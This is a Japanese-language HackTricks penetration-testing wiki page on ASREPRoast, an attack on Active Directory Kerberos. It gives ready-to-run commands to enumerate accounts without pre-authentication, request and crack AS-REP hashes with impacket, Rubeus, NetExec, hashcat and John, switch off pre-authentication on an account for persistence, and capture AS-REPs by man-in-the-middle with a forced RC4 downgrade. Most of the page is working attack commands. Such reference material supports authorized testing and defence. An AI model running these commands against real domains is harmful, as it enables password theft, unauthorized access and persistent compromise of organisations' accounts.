# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos pre-authentication required attribute**が設定されていないユーザーを悪用するsecurity attackです。基本的に、この脆弱性を利用すると、攻撃者はユーザーのpasswordを必要とせず、Domain Controller（DC）に対してユーザーのauthenticationを要求できます。するとDCは、ユーザーのpasswordから導出されたkeyで暗号化したmessageを返します。攻撃者はこれをofflineでcrackし、ユーザーのpasswordを特定できます。

このattackの主な要件は次のとおりです。

- **Kerberos pre-authenticationがないこと**: 対象ユーザーでこのsecurity featureが有効になっていない必要があります。
- **Domain Controller（DC）への接続**: 攻撃者はDCにアクセスしてrequestsを送信し、暗号化されたmessagesを受信する必要があります。
- **Optional domain account**: domain accountがあると、LDAP queriesによって脆弱なユーザーをより効率的に特定できます。そのようなaccountがない場合、攻撃者はusernameを推測する必要があります。

#### 脆弱なユーザーのEnumerating（domain credentialsが必要）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP メッセージ
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus はデフォルトで **RC4** を要求するため、Event ID **4768** では通常、**preauth type 0** と **ticket encryption type 0x17** が表示されます。**`/aes`** を追加した場合（または対象で RC4 が無効になっている場合）は、代わりに **AES etypes** が表示されます。<sup>[[2]](#references)</sup>

#### Quick one-liners (Linux)

- まず、Kerberos userenum で潜在的な対象を列挙します（例：leaked build paths から）。`kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec を使い、有効な creds なしで username リスト全体を Roast します：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- creds がある場合は、NetExec に LDAP をクエリさせ、Roast 対象となるすべてのアカウントを要求させます：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 出力が **`$krb5asrep$23$`** で始まる場合は、Hashcat の **`-m 18200`** で crack します。**`$krb5asrep$17$`** または **`$krb5asrep$18$`** で始まる場合は、John の **`--format=krb5asrep`** を優先します。<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

すべての AS-REP roast が RC4 だと決めつけないでください。Modern tooling は、要求またはネゴシエートされた enctype に応じて、**RC4**（`$krb5asrep$23$`）または **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）を返すことがあります。**`hashcat -m 18200`** は **etype 23** 用ですが、**John** は **17/18/23** の `krb5asrep` を直接処理できます。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーで **preauth** を不要に強制する：
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## 認証情報なしの ASREProast

攻撃者は中間者の位置を利用して、Kerberos pre-authentication が無効化されていなくても、ネットワークを通過する AS-REP パケットをキャプチャできます。そのため、VLAN 上のすべてのユーザーに対して機能します。\
no-preauth principal から **TGT** ではなく **service ticket** を返す、認証情報不要の関連トリックについては、[Kerberoast](kerberoast.md) を参照してください。

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使用すると、これを実行できます。`relay` mode は、クライアントが **etype 23** をまだアドバタイズしている場合に **RC4** を強制できるため、offensive な用途では興味深いモードです。一方、`listen` は passive のままで、クライアントと DC がネゴシエートした内容をそのままキャプチャします。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考資料

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
